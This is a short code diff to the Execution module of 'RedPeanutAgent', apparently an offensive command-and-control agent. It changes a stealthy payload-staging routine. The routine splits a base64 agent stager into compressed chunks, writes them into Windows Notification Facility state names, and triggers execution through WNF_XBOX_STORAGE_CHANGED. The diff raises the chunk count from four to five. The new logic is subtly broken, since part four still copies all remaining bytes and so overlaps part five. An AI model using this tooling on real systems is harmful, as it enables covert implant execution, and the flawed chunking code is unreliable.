@@ -23,6 +23,7 @@ namespace RedPeanutAgent.Execution
                 var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
                 var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
                 var s4 = UpdateWnf(Natives.PART_4, new byte[] { });
+                var s5 = UpdateWnf(Natives.PART_5, new byte[] { });
 
                 UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[0] { });
             }
@@ -43,31 +44,36 @@ namespace RedPeanutAgent.Execution
                 var s2 = UpdateWnf(Natives.PART_2, new byte[] { });
                 var s3 = UpdateWnf(Natives.PART_3, new byte[] { });
                 var s4 = UpdateWnf(Natives.PART_4, new byte[] { });
-
+                var s5 = UpdateWnf(Natives.PART_5, new byte[] { });
 
                 stager = Encoding.Default.GetBytes(agentB64);
 
-                var chunksize = stager.Length / 4;
+                var chunksize = stager.Length / 5;
                 var part1 = new MemoryStream();
                 var part2 = new MemoryStream();
                 var part3 = new MemoryStream();
                 var part4 = new MemoryStream();
+                var part5 = new MemoryStream();
 
                 part1.Write(stager, 0, chunksize);
                 part2.Write(stager, chunksize, chunksize);
                 part3.Write(stager, chunksize * 2, chunksize);
                 part4.Write(stager, chunksize * 3, stager.Length - (chunksize * 3));
+                //
+                part5.Write(stager, chunksize * 4, stager.Length - (chunksize * 4));
 
                 var p1_compressed = CompressGZipAssembly(part1.ToArray());
                 var p2_compressed = CompressGZipAssembly(part2.ToArray());
                 var p3_compressed = CompressGZipAssembly(part3.ToArray());
                 var p4_compressed = CompressGZipAssembly(part4.ToArray());
+                var p5_compressed = CompressGZipAssembly(part5.ToArray());
 
                 if (
                     (p1_compressed.Length > 2048) ||
                     (p2_compressed.Length > 2048) ||
                     (p3_compressed.Length > 2048) ||
-                    (p4_compressed.Length > 2048)
+                    (p4_compressed.Length > 2048) ||
+                    (p5_compressed.Length > 2048)
                 )
                 {
                     Console.WriteLine("Error, size too large!");
@@ -78,6 +84,7 @@ namespace RedPeanutAgent.Execution
                 s2 = UpdateWnf(Natives.PART_2, p2_compressed);
                 s3 = UpdateWnf(Natives.PART_3, p3_compressed);
                 s4 = UpdateWnf(Natives.PART_4, p4_compressed);
+                s5 = UpdateWnf(Natives.PART_5, p5_compressed);
 
                 UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[1] { 0x1 });
             }
